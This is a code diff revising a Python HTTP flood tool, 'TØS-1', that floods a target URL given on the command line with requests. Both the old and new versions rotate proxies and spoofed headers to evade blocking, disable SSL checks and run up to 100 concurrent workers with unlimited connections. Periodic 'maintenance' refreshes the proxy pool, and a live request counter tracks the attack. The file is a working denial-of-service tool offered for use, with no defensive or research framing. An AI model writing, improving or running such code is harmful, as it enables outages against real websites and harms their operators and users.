@@ -6,255 +6,333 @@ import os
 import sys
 from datetime import datetime
 
-class TOS1:
+class TOS1_S023:
     def __init__(self, target_url):
         self.target_url = target_url
         self.session_id = "S023"
         self.total_requests = 0
+        self.start_time = time.time()
+        
+        # Proxy system
+        self.proxy_files = ['h1.txt', 'h2.txt']
         self.proxies = []
+        self.current_proxy_index = 0
+        self.proxy_rotation_count = 0
+        
+        # Header system
+        self.ua_file = 'ua.txt'
         self.user_agents = []
         self.headers_list = []
-        self.device_ids = []
-        self.session_ids = []
         
-        # Performance tracking
-        self.start_time = time.time()
-        self.last_display_update = time.time()
-        self.requests_since_update = 0
+        # Attack control
+        self.attacking = True
+        self.connector = None
+        self.semaphore = asyncio.Semaphore(1000)  # Max concurrent requests
         
         # Maintenance
         self.last_maintenance = time.time()
         self.maintenance_interval = 900  # 15 minutes
-        self.maintenance_duration = 30   # 30 seconds maintenance
-        self.attack_active = False
+        self.maintenance_active = False
         
-        # Control
-        self.running = True
+        # Performance tracking
+        self.requests_per_second = 0
+        self.last_rps_calc = time.time()
+        self.requests_since_last_calc = 0
         
-        # Load UAs from file
-        self.load_user_agents()
-        
-    def load_user_agents(self):
-        try:
-            with open('ua.txt', 'r') as f:
-                self.user_agents = [line.strip() for line in f if line.strip()]
-        except:
-            # Fallback UAs if file not found
-            self.user_agents = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
-            ]
+    def clear_terminal(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
     
-    async def fetch_proxies(self):
-        """Fetch proxies before attack starts"""
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] Fetching proxies...")
-        url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000"
+    def load_proxies(self):
+        """Load and test proxies from files"""
+        self.proxies = []
+        for file in self.proxy_files:
+            if os.path.exists(file):
+                with open(file, 'r') as f:
+                    lines = f.readlines()
+                    for line in lines:
+                        proxy = line.strip()
+                        if proxy and ':' in proxy:
+                            self.proxies.append(f'http://{proxy}')
         
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, timeout=30) as response:
-                    if response.status == 200:
-                        text = await response.text()
-                        raw_proxies = [p.strip() for p in text.split('\n') if p.strip()]
-                        self.proxies = [f"http://{p}" for p in raw_proxies]
-                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Loaded {len(self.proxies)} proxies")
-                    else:
-                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Failed to fetch proxies")
-        except Exception as e:
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] Proxy fetch error: {str(e)}")
+        print(f"[+] Loaded {len(self.proxies)} proxies")
+        return len(self.proxies) > 0
+    
+    def load_user_agents(self):
+        """Load user agents from file"""
+        if os.path.exists(self.ua_file):
+            with open(self.ua_file, 'r') as f:
+                self.user_agents = [line.strip() for line in f if line.strip()]
+        
+        # Generate realistic headers
+        self.generate_headers()
+        
+        return len(self.user_agents) > 0
     
     def generate_headers(self):
-        """Generate realistic headers"""
-        base_headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
+        """Generate realistic headers for rotation"""
+        accept_languages = [
+            'en-US,en;q=0.9',
+            'en-GB,en;q=0.8',
+            'de-DE,de;q=0.9',
+            'fr-FR,fr;q=0.8',
+            'es-ES,es;q=0.9'
+        ]
+        
+        accept_encodings = ['gzip, deflate, br', 'gzip, deflate']
+        
+        self.headers_list = []
+        for ua in self.user_agents[:50]:  # Use first 50 for variety
+            headers = {
+                'User-Agent': ua,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': random.choice(accept_languages),
+                'Accept-Encoding': random.choice(accept_encodings),
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache'
+            }
+            self.headers_list.append(headers)
+    
+    def get_random_headers(self):
+        """Get random realistic headers"""
+        if self.headers_list:
+            return random.choice(self.headers_list)
+        return {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*'
         }
-        return base_headers
     
-    def rotate_identifiers(self):
-        """Generate new IDs"""
-        self.device_ids = [f"DEV{random.randint(10000, 99999)}" for _ in range(100)]
-        self.session_ids = [f"SESS{random.randint(100000, 999999)}" for _ in range(100)]
-        self.headers_list = [self.generate_headers() for _ in range(100)]
-    
-    async def check_proxy(self, proxy):
-        """Test if proxy is working"""
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(self.target_url, proxy=proxy, timeout=5) as response:
-                    return response.status < 500
-        except:
-            return False
-    
-    async def test_proxies(self):
-        """Test all proxies and keep only working ones"""
+    def get_next_proxy(self):
+        """Get next proxy in rotation"""
         if not self.proxies:
-            return
+            return None
         
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] Testing {len(self.proxies)} proxies...")
+        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
+        self.proxy_rotation_count += 1
         
-        tasks = []
-        for proxy in self.proxies:
-            tasks.append(self.check_proxy(proxy))
+        return self.proxies[self.current_proxy_index]
+    
+    async def make_request(self, session):
+        """Make a single request with random proxy and headers"""
+        try:
+            proxy = self.get_next_proxy()
+            headers = self.get_random_headers()
+            
+            async with self.semaphore:
+                async with session.get(
+                    self.target_url,
+                    headers=headers,
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10),
+                    ssl=False
+                ) as response:
+                    await response.read()
+                    return True
+                    
+        except Exception as e:
+            return False
+        finally:
+            self.total_requests += 1
+            self.requests_since_last_calc += 1
+    
+    async def attack_worker(self, session, worker_id):
+        """Worker that sends requests continuously"""
+        while self.attacking and not self.maintenance_active:
+            await self.make_request(session)
+            
+            # Calculate RPS every second
+            current_time = time.time()
+            if current_time - self.last_rps_calc >= 1.0:
+                self.requests_per_second = self.requests_since_last_calc
+                self.requests_since_last_calc = 0
+                self.last_rps_calc = current_time
+    
+    async def maintenance_cycle(self):
+        """Maintenance every 15 minutes"""
+        while True:
+            await asyncio.sleep(1)
+            
+            current_time = time.time()
+            if (current_time - self.last_maintenance >= self.maintenance_interval and 
+                not self.maintenance_active and self.attacking):
+                
+                print(f"\n[!] TØS Maintenance Started")
+                self.maintenance_active = True
+                
+                # Pause attacks
+                await asyncio.sleep(2)
+                
+                # Refresh proxies
+                self.load_proxies()
+                self.load_user_agents()
+                self.generate_headers()
+                
+                # Clear any session data
+                if self.connector:
+                    await self.connector.close()
+                
+                print(f"[+] Maintenance Complete - Refreshed {len(self.proxies)} proxies")
+                
+                self.maintenance_active = False
+                self.last_maintenance = current_time
+    
+    async def proxy_warmup(self):
+        """30-second warmup to find working proxies"""
+        print("𝖳Ø𝖲-1 | 𝖲023")
+        await asyncio.sleep(2)
+        self.clear_terminal()
         
-        results = await asyncio.gather(*tasks, return_exceptions=True)
+        print("[+] 30s Warmup - Testing proxies...")
+        warmup_end = time.time() + 30
         
         working_proxies = []
-        for i, result in enumerate(results):
-            if result is True:
-                working_proxies.append(self.proxies[i])
         
-        self.proxies = working_proxies
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] {len(self.proxies)} proxies working")
-    
-    async def send_request(self, session, proxy, headers):
-        """Send single request through proxy"""
-        try:
-            async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=10) as response:
-                await response.read()
-                return True
-        except:
-            return False
-    
-    async def attack_worker(self, worker_id):
-        """Worker that sends requests"""
-        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
-        
-        async with aiohttp.ClientSession(connector=connector) as session:
-            while self.running:
-                if not self.attack_active:
-                    await asyncio.sleep(0.01)
-                    continue
-                
-                if not self.proxies:
-                    await asyncio.sleep(0.1)
-                    continue
-                
-                # Rotate everything
+        while time.time() < warmup_end:
+            if self.proxies:
                 proxy = random.choice(self.proxies)
-                headers = random.choice(self.headers_list) if self.headers_list else {}
-                headers['User-Agent'] = random.choice(self.user_agents)
-                
-                if self.device_ids:
-                    headers['X-Device-ID'] = random.choice(self.device_ids)
-                if self.session_ids:
-                    headers['X-Session-ID'] = random.choice(self.session_ids)
-                
-                success = await self.send_request(session, proxy, headers)
-                
-                self.total_requests += 1
-                self.requests_since_update += 1
-                
-                # Small delay to prevent overwhelming
-                await asyncio.sleep(0.001)
-    
-    def update_display(self):
-        """Update display with overwriting"""
-        current_time = time.time()
-        
-        if current_time - self.last_display_update >= 0.001:  # Every millisecond
-            elapsed = current_time - self.last_display_update
-            current_rps = self.requests_since_update / elapsed if elapsed > 0 else 0
+                try:
+                    connector = aiohttp.TCPConnector(ssl=False)
+                    timeout = aiohttp.ClientTimeout(total=5)
+                    
+                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+                        async with session.get(
+                            'http://httpbin.org/ip',
+                            proxy=proxy,
+                            timeout=aiohttp.ClientTimeout(total=5)
+                        ) as response:
+                            if response.status == 200:
+                                working_proxies.append(proxy)
+                    
+                    await connector.close()
+                except:
+                    pass
             
-            sys.stdout.write(f"\rTØS-TRS — {self.total_requests} | {{{self.session_id}, TØS-RR}}")
+            await asyncio.sleep(0.1)
+        
+        # Update proxies with working ones
+        if working_proxies:
+            self.proxies = working_proxies
+            print(f"[+] Found {len(self.proxies)} working proxies")
+        else:
+            print("[-] No working proxies found, using direct connection")
+            self.proxies = []
+        
+        await asyncio.sleep(1)
+        self.clear_terminal()
+    
+    async def display_stats(self):
+        """Display stats with overwriting"""
+        while self.attacking:
+            current_time = time.time()
+            elapsed = current_time - self.start_time
+            minutes = int(elapsed // 60)
+            seconds = int(elapsed % 60)
+            
+            # Calculate maintenance time
+            maintenance_time = max(0, self.maintenance_interval - (current_time - self.last_maintenance))
+            maint_min = int(maintenance_time // 60)
+            maint_sec = int(maintenance_time % 60)
+            
+            # Overwriting display
+            sys.stdout.write(f'\rTØS-TRS — {self.total_requests:,} | {{S023, TØS-RR}} | RPS: {self.requests_per_second:,} | Next Maint: {maint_min:02d}:{maint_sec:02d}')
             sys.stdout.flush()
             
-            self.requests_since_update = 0
-            self.last_display_update = current_time
+            await asyncio.sleep(0.001)  # Every millisecond
     
-    def check_maintenance(self):
-        """Check if maintenance is needed"""
-        current_time = time.time()
-        
-        if current_time - self.last_maintenance >= self.maintenance_interval:
-            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] MAINTENANCE STARTED")
-            self.attack_active = False
-            
-            # Clear junk
-            self.proxies.clear()
-            self.rotate_identifiers()
-            
-            # Schedule resume
-            asyncio.create_task(self.perform_maintenance())
-            
-            self.last_maintenance = current_time
-    
-    async def perform_maintenance(self):
-        """Perform maintenance tasks"""
-        await asyncio.sleep(self.maintenance_duration)
-        
-        # Refresh everything
-        await self.fetch_proxies()
-        await self.test_proxies()
-        self.rotate_identifiers()
-        
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] MAINTENANCE COMPLETE")
-        self.attack_active = True
-    
-    async def start(self):
-        """Main attack loop"""
+    async def run(self):
+        """Main attack function"""
         # Initial display
         print("𝖳Ø𝖲-1 | 𝖲023")
         await asyncio.sleep(2)
-        os.system('clear' if os.name == 'posix' else 'cls')
+        self.clear_terminal()
         
-        # 1 minute preparation
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] Preparing attack (60s)...")
+        # Load resources
+        if not self.load_proxies():
+            print("[-] No proxy files found")
+            return
         
-        start_prep = time.time()
-        await self.fetch_proxies()
-        await self.test_proxies()
-        self.rotate_identifiers()
+        if not self.load_user_agents():
+            print("[-] No user agents found")
+            return
         
-        # Wait until 60 seconds total prep time
-        prep_elapsed = time.time() - start_prep
-        if prep_elapsed < 60:
-            await asyncio.sleep(60 - prep_elapsed)
+        # 30-second proxy warmup
+        await self.proxy_warmup()
         
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] STARTING ATTACK")
-        self.attack_active = True
+        print(f"[+] Target: {self.target_url}")
+        print(f"[+] Proxies: {len(self.proxies)}")
+        print(f"[+] Headers pool: {len(self.headers_list)}")
+        print("[+] Starting attack...\n")
         
-        # Start multiple workers
-        workers = []
-        for i in range(50):  # 50 concurrent workers
-            workers.append(asyncio.create_task(self.attack_worker(i)))
+        # Create session with high concurrency
+        self.connector = aiohttp.TCPConnector(
+            limit=0,  # No limit
+            limit_per_host=0,
+            ttl_dns_cache=300,
+            use_dns_cache=True,
+            ssl=False
+        )
         
-        # Main loop
-        try:
-            while self.running:
-                self.update_display()
-                self.check_maintenance()
-                await asyncio.sleep(0.001)  # 1ms sleep
-        except KeyboardInterrupt:
-            self.running = False
-            print("\n\n=== ATTACK STOPPED ===")
-        finally:
-            # Cleanup
-            for worker in workers:
-                worker.cancel()
+        async with aiohttp.ClientSession(
+            connector=self.connector,
+            timeout=aiohttp.ClientTimeout(total=30)
+        ) as session:
             
-            print(f"\nTotal Requests: {self.total_requests}")
-            print(f"Runtime: {time.time() - self.start_time:.1f}s")
+            # Start all tasks
+            tasks = []
+            
+            # Start maintenance cycle
+            tasks.append(asyncio.create_task(self.maintenance_cycle()))
+            
+            # Start stats display
+            tasks.append(asyncio.create_task(self.display_stats()))
+            
+            # Start attack workers (100 workers for high RPS)
+            for i in range(100):
+                tasks.append(asyncio.create_task(self.attack_worker(session, i)))
+            
+            # Run forever
+            try:
+                await asyncio.gather(*tasks)
+            except KeyboardInterrupt:
+                self.attacking = False
+                print("\n\n[!] Attack stopped by user")
+            finally:
+                # Cleanup
+                await self.connector.close()
 
-async def main():
-    if len(sys.argv) < 2:
+def main():
+    if len(sys.argv) != 2:
         print("Usage: python tos1.py https://target.com")
         return
     
-    target = sys.argv[1]
-    attack = TOS1(target)
-    await attack.start()
+    target_url = sys.argv[1]
+    
+    # Set high process priority (Unix/Mac)
+    if os.name != 'nt':
+        try:
+            os.nice(-20)  # Maximum priority
+        except:
+            pass
+    
+    tos = TOS1_S023(target_url)
+    
+    # Set event loop policy for better performance
+    if sys.platform == 'win32':
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    
+    try:
+        asyncio.run(tos.run())
+    except KeyboardInterrupt:
+        print("\n\n=== TØS-1 FINAL STATS ===")
+        print(f"Total Requests: {tos.total_requests:,}")
+        runtime = time.time() - tos.start_time
+        print(f"Runtime: {int(runtime // 60):02d}:{int(runtime % 60):02d}")
+        print(f"Average RPS: {tos.total_requests / runtime if runtime > 0 else 0:.1f}")
+        print("=" * 40)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
